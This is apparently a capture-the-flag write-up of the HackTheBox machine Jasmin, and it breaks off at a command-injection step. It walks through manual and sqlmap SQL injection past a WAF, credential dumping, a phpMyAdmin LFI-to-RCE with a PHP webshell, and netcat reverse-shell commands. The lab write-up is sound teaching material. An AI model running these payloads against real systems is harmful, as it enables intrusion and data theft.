---
title: HTB: Jasmin
url: https://0xdf.gitlab.io/2019/11/09/htb-jasmin.html
date: 2019-11-09T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-jasmin, hackthebox, nmap, waf, gobuster, sqli, injection, sqlmap, phpmyadmin, cve-2018-12613, python, systemctl, service, gtfobins, command-injection, oscp-like-v2, oscp-like-v1
---

![Jasmin](https://0xdfimages.gitlab.io/img/jasmin-cover.png)

Jasmin provide three steps that were all relatively basic. First, there’s an SQL injection with a WAF that breaks `sqlmap`, at least in it’s default configuration. Then there’s a command injection into a Python script. And finally there’s creating a malicious service. In Beyond root, I’ll look at the WAF and the cleanup script.

## Box Info

| Name | [Jasmin](https://hackthebox.com/machines/jasmin)  [Jasmin](https://hackthebox.com/machines/jasmin) [Play on HackTheBox](https://hackthebox.com/machines/jasmin) |
| --- | --- |
| Release Date | [22 Jun 2019](https://twitter.com/hackthebox_eu/status/1141302888175722498) |
| Retire Date | 09 Nov 2019 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Jasmin |
| Radar Graph | Radar chart for Jasmin |
| First Blood User | 00:26:29[mprox mprox](https://app.hackthebox.com/users/16690) |
| First Blood Root | 00:41:30[mprox mprox](https://app.hackthebox.com/users/16690) |
| Creators | [manulqwerty manulqwerty](https://app.hackthebox.com/users/25205)  [Ghostpp7 Ghostpp7](https://app.hackthebox.com/users/24844) |

## Recon

### nmap

`nmap` shows ssh (22) and two http ports (80 and 64999):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.143
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-27 14:53 EDT
Nmap scan report for 10.10.10.143
Host is up (0.032s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds

root@kali# nmap -sC -sV -p 22,80,64999 -oA scans/nmap-scripts 10.10.10.143
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-27 14:54 EDT
Nmap scan report for 10.10.10.143
Host is up (0.031s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.58 seconds

```

The OS is likely Debian 9 (Stretch) based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions.

### Website - TCP 80

#### Site

The page is for the Stark Hotel:

![](https://0xdfimages.gitlab.io/img/StarkHotel.jpg)

A lot of the links don’t work, or go to static pages. But in clicking around, I noticed clicking on one of the “Book Now” buttons leads to `room.php`, which takes a GET parameter: `http://10.10.10.143/room.php?cod=1`.

#### IronWAF

Looking at the site response headers, I’ll notice one about IronWAF version 2.0.3:

```

HTTP/1.1 200 OK
Date: Fri, 28 Jun 2019 05:50:06 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
IronWAF: 2.0.3
Content-Length: 6131
Connection: close
Content-Type: text/html; charset=UTF-8

```

A quick google doesn’t return any results for IronWAF, so it might be a custom thing for this box. Either way, if I get blocked or get weird responses when I start exploiting, I can try some WAF evasion techniques.

#### gobuster

In addition to the pages I already noticed clicking around the website, there’s also a `phpmyadmin` directory.

```

root@kali# gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuter-80-root-php -t 40                                   
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2019/06/28 01:51:46 Starting gobuster
===============================================================
/nav.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/images (Status: 301)
/js (Status: 301)
/index.php (Status: 200)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/room.php (Status: 302)
/connection.php (Status: 200)
/sass (Status: 301)
===============================================================
2019/06/28 01:54:12 Finished
===============================================================

```

### Website - TCP 64999

The site just has a static bit of text:

> ﻿Hey you have been banned for 90 seconds, don’t be bad

This could be related to the WAF?

## Shell as www-data

### SQL Injection

#### Enumeration

I took note earlier of `room.php` which took an argument, `cod`. I can break the page by adding a `'` at the end:

![](https://0xdfimages.gitlab.io/img/jasmin_id_sqli.gif)

It doesn’t crash the page or return 500, but the information and picture for the room aren’t there anymore. This suggests SQL Injection.

#### sqlmap

The easiest way to test SQLI is to through it over to `sqlmap`. Here, it crashes out:

```

root@kali# sqlmap -u http://10.10.10.143/room.php?cod=1
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.4#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:02:36 /2019-06-28/

[02:02:36] [INFO] testing connection to the target URL
[02:02:36] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:02:36] [WARNING] turning off pre-connect mechanism because of connection reset(s)
[02:02:36] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
do you want sqlmap to try to detect backend WAF/IPS? [y/N] y
[02:02:40] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[02:02:40] [INFO] using WAF scripts to detect backend WAF/IPS protection
[02:02:40] [WARNING] there is a possibility that the target (or WAF/IPS) is resetting 'suspicious' requests
[02:02:40] [INFO] heuristics detected web page charset 'ascii'
[02:02:40] [WARNING] WAF/IPS product hasn't been identified
[02:02:40] [INFO] testing if the target URL content is stable
[02:02:41] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
[02:02:45] [INFO] searching for dynamic content
[02:02:45] [CRITICAL] page not found (404)
[02:02:45] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 8 times

[*] ending @ 02:02:45 /2019-06-28/

```

Not only that, but the site now returns the same message I saw earlier on port 64999 about being blocked for 90 seconds.

### Path 1: PHPMyAdmin

#### Manual SQLi

I can work through this Injection manually. I’ll start by checking for a UNION injection. I’ll set `cod=100` (something that returns nothing), and then add the union. I’ll start with `http://10.10.10.143/room.php?cod=100 UNION SELECT 1;-- -`. When that return nothing, I’ll change the `SELECT` to `SELECT 1,2`. Then `1,2,3`. When I get to `http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -`, parts of the page populate again:

![1561702665655](https://0xdfimages.gitlab.io/img/1561702665655.png)

I can compare that to a legit `cod=1`:

![1561702740456](https://0xdfimages.gitlab.io/img/1561702740456.png)

I can see that column 5 is the picture, 2 seems to be the room title, 3 must be the price, and 4 must be the description text.

I’ll use column 2 to get information from the databases. When solving Jasmin I had recently learned of `group_concat()`, which will put all the values from different rows into one string, which is awesome for this. I’ll start by listing the databases. hotel seems like the most interesting, but it only has one table, and that doesn’t seem interesting based on the columns. I’ll next take a look at the mysql table:

| Goal | Injection |
| --- | --- |
| Result |
| List DBs | `SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -` |
| hotel,information\_schema,mysql,performance\_schema |
| Show Tables in hotel | `SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- -` |
| room |
| Show Columns in room | `SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -` |
| cod,name,price,descrip,star,image,mini |
| Show Tables in mysql | `SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -` |
| column\_stats,columns\_priv,db,event,func, general\_log,gtid\_slave\_pos,help\_category, help\_keyword,help\_relation,help\_topic,host, index\_stats,innodb\_index\_stats,innodb\_table\_stats, plugin,proc,procs\_priv,proxies\_priv,roles\_mapping, servers,slow\_log,table\_stats,tables\_priv,time\_zone, time\_zone\_leap\_second,time\_zone\_name, time\_zone\_transition,time\_zone\_transition\_type,user |
| Show Columns in user | `SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- -` |
| Host,User,Password,Select\_priv,Insert\_priv,Update\_priv, Delete\_priv,Create\_priv,Drop\_priv,Reload\_priv, Shutdown\_priv,Process\_priv,File\_priv,Grant\_priv, References\_priv,Index\_priv,Alter\_priv,Show\_db\_priv, Super\_priv,Create\_tmp\_table\_priv,Lock\_tables\_priv, Execute\_priv,Repl\_slave\_priv,Repl\_client\_priv, Create\_view\_priv,Show\_view\_priv,Create\_routine\_priv, Alter\_routine\_priv,Create\_user\_priv,Event\_priv, Trigger\_priv,Create\_tablespace\_priv,ssl\_type,ssl\_cipher, x509\_issuer,x509\_subject,max\_questions,max\_updates, max\_connections,max\_user\_connections,plugin, authentication\_string,password\_expired,is\_role, default\_role,max\_statement\_time |
| Get Username / Password | `SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -` |
| DBadmin 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 |

A [hashes.org search](https://hashes.org/search.php) gives the password:

```

MYSQL5 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou

```

#### PHPMyAdmin

That username / password will get into the phpmyadmin site:

![1561706176995](https://0xdfimages.gitlab.io/img/1561706176995.png)

I can see the version is 4.8.0:

![1561706200364](https://0xdfimages.gitlab.io/img/1561706200364.png)

There’s an vulnerability in this version, [CVE-2018-12613](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e). It’s a local file include (LFI) that allows for remote code execution (RCE).

The LFI is because there is an inconsistency in how `%3f` is handled in the security check and the include. I can visit `http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd` and see the include works:

[![passwd](https://0xdfimages.gitlab.io/img/1561706568973.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/1561706568973.png)

Now it’s just a matter of getting some php code I want to run on the site. I can do that by issuing a SQL query, and then including my php session info.

I’ll click on the “SQL” tab at the top, and enter the query:

```

SELECT '<?php system($_GET["cmd"]);?>'

```

Then I hit go:

![1561706788284](https://0xdfimages.gitlab.io/img/1561706788284.png)

Now, I’ll include my php session info. I’ll check burp to grab my `phpMyAdmin` cookie, and visit: `http://10.10.10.143/phpmyadmin/index.php?cmd=id&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_e3qctegac4saf72rocbl1541j26u7mqm`:

![1561707173193](https://0xdfimages.gitlab.io/img/1561707173193.png)

Now I can get a shell changing `cmd=id` to `cmd=nc -e /bin/sh 10.10.14.8 443`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:35900.
‍id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Path 2: WebShell Via SQLi

#### sqlmap

It seems that IronWAF isn’t perfect against `sqlmap`. I got it to work sometimes. But with a bit of tweaking, I could get it to work reliably. The options I’ll use are `--random-agent` to mess with the user agent string, and low level and risk.

```

root@kali# sqlmap -u http://10.10.10.143:80/room.php?cod=1 --random-agent --level 1 --risk 1  --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[15:03:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 GTB5' from file '/usr/share/sqlmap/txt/user-agents.txt'
[15:03:25] [INFO] testing connection to the target URL
[15:03:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:03:25] [INFO] testing if the target URL content is stable
[15:03:26] [INFO] target URL content is stable
[15:03:26] [INFO] testing if GET parameter 'cod' is dynamic
[15:03:26] [INFO] GET parameter 'cod' appears to be dynamic
[15:03:26] [INFO] heuristic (basic) test shows that GET parameter 'cod' might be injectable
[15:03:26] [INFO] testing for SQL injection on GET parameter 'cod'
[15:03:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:03:27] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="of")
[15:03:28] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
...[snip]...
[15:03:40] [INFO] GET parameter 'cod' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[15:03:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:03:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:03:40] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:03:40] [INFO] target URL appears to have 7 columns in query
[15:03:41] [INFO] GET parameter 'cod' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 8643=8643

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-1250 UNION ALL SELECT CONCAT(0x71716a6b71,0x5a79784d6b726747766a5361735841666d6569556e4671434363656e617a77797162477578515647,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL-- FOKX
---
[15:03:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[15:03:41] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 15:03:41 /2019-06-28/

```

I can use this to dump the sql username and password:

```

root@kali# sqlmap -u http://10.10.10.143:80/room.php?cod=1 --random-agent --level 1 --risk 1  --batch --users --passwords
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:05:59 /2019-06-28/

[15:05:59] [INFO] fetched random HTTP User-Agent header value 'Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50' from file '/usr/share/sqlmap/txt/user-agents.txt'
[15:06:00] [INFO] resuming back-end DBMS 'mysql'
[15:06:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 8643=8643

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-1250 UNION ALL SELECT CONCAT(0x71716a6b71,0x5a79784d6b726747766a5361735841666d6569556e4671434363656e617a77797162477578515647,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL-- FOKX
---
[15:06:00] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[15:06:00] [INFO] fetching database users
[15:06:00] [INFO] used SQL query returns 28 entries
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:00] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
[15:06:01] [INFO] retrieved: ''DBadmin'@'localhost''
database management system users [1]:
[*] 'DBadmin'@'localhost'

[15:06:01] [INFO] fetching database users password hashes
[15:06:02] [INFO] used SQL query returns 1 entry
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
[15:06:02] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[15:06:02] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[15:06:02] [INFO] starting dictionary-based cracking (mysql_passwd)
[15:06:02] [INFO] starting 3 processes
[15:06:08] [INFO] cracked password 'imissyou' for user 'DBadmin'
database management system users password hashes:
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou

[15:06:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 15:06:17 /2019-06-28/

```

I can use that to do the same phpmyadmin attack as shown above. But I can also use it to write a webshell:

```

root@kali# sqlmap -u http://10.10.10.143:80/room.php?cod=1 --random-agent --level 1 --risk 1  --batch --file-write /opt/shells/php/cmd.php --file-dest /var/www/html/0xdf.php
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.3.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:08:51 /2019-06-28/

[15:08:51] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18' from file '/usr/share/sqlmap/txt/user-agents.txt'
[15:08:52] [INFO] resuming back-end DBMS 'mysql' 
[15:08:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 8643=8643

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cod=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-1250 UNION ALL SELECT CONCAT(0x71716a6b71,0x5a79784d6b726747766a5361735841666d6569556e4671434363656e617a77797162477578515647,0x716b717871),NULL,NULL,NULL,NULL,NULL,NULL-- FOKX
---
[15:08:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[15:08:52] [INFO] fingerprinting the back-end DBMS operating system
[15:08:52] [INFO] the back-end DBMS operating system is Linux
[15:08:52] [WARNING] expect junk characters inside the file as a leftover from UNION query
do you want confirmation that the local file '/opt/shells/php/cmd.php' has been successfully written on the back-end DBMS file system ('/var/www/html/0xdf.php')? [Y/n] Y
[15:08:52] [INFO] the remote file '/var/www/html/0xdf.php' is larger (41 B) than the local file '/opt/shells/php/cmd.php' (35B)
[15:08:52] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'

[*] ending @ 15:08:52 /2019-06-28/

```

Now I can reach it at:

```

root@kali# curl http://10.10.10.143/0xdf.php?cmd=id
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
root@kali# curl -s http://10.10.10.143/0xdf.php?cmd=id  --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
root@kali# curl -s http://10.10.10.143/0xdf.php?cmd=id  --output - | xxd
00000000: 7569 643d 3333 2877 7777 2d64 6174 6129  uid=33(www-data)
00000010: 2067 6964 3d33 3328 7777 772d 6461 7461   gid=33(www-data
00000020: 2920 6772 6f75 7073 3d33 3328 7777 772d  ) groups=33(www-
00000030: 6461 7461 290a 0000 0000 0000            data).......

```

It looks like it appended some nulls on the end for some reason, probably a part of the sqli file write. But it still works.

#### Shell

I can use that to get a shell:

```

root@kali# curl -s http://10.10.10.143/0xdf.php?cmd=nc+-e+/bin/bash+10.10.14.8+443

```

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:37142.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### Shell Upgrade

With either shell, I’ll upgrade with the standard technique:
1. `python -c 'import pty;pty.spawn("bash")'`
2. [ctrl-z] to background shell
3. `stty raw -echo`
4. `fg`
5. `reset`
6. Enter `screen` if asked for a terminal type.

Now I have a full terminal, with arrows, tab completion, etc:

```

www-data@jasmin:/var/www/html$ 

```

## Priv: www-data –> pepper

### Enumeration

Before I go through the trouble of uploading `LinEnum.sh` to target, I usually run `sudo -l` just to check what commands I might be able to run as another user without a password. Here this gives me a good lead:

```

www-data@jasmin:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jasmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jasmin:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

```

### simpler.py

The script itself is a `python3` script used to manage and provide statistics on the webserver:

```

#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()

```

Looking at the usage, there are three command line options:
- Show statistics about recent attacks
- Show list of attacker IPs
- Ping an IP

I’m immediately drawn to the `ping` option, because it seems unlikely to me that they’ve implemented `ping` in `python`, but rather that there’s a `system` or `subprocess` call. I’m right:

```

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')   
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

```

`exec_ping` is called directly from `main` if the `-p` is given:

```

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()

```

### Command Injection

There’s a clear command injection in the `exec_ping` code where my input is read to `command`:

```

    os.system('ping ' + command)

```

The problem is that I can’t use any of the forbidden characters:

```

['&', ';', '-', '`', '||', '|']

```

